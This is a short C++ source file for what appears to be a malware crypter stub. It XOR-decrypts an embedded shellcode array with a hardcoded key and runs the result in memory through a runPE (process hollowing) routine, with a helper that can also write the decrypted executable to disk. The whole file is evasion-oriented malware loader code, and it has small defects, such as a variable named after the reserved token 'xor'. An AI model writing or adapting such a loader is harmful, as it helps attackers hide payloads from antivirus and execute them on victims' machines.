#include <Windows.h>
#include "Crypto.h"
#include "runPE.h"
#include "shellcode.h"
#include <stdint.h>
#include <fstream>

uint32_t key[4] = { 0xACB6,0x1344,0xEC90,0x285C };

bool WriteExecutable(DATA *data) {
	std::ofstream f("decrypted.exe", std::ios::out | std::ios::binary);
	if (f.is_open()) {
		f.write(data->image, data->size);
		if(f.bad())
			std::cout << "Writing to file failed" << std::endl;
		system("pause");
		f.close();
		return true;
	}
	return false;
}


int main() {

	// Extern in shellcode.h
	extern unsigned int size;
	extern unsigned char shellcode[];
	DATA *data = (DATA*)malloc(sizeof(DATA));
	data->image = (char*)malloc(size);

	// Set up the data structure with shellcode and size
	memcpy(data->image, shellcode, size);
	data->size = size;

	// Decrypt shellcode
	Crypto<CryptPolicyXOR> xor;
	xor.doDecrypt(data, key, sizeof(key)/sizeof(*key));
	runPE rp;
	TCHAR szFilePath[1024];
	GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
	rp.run(LPSTR(szFilePath), data->image); // Execute shellcode in memory
	return 0;
}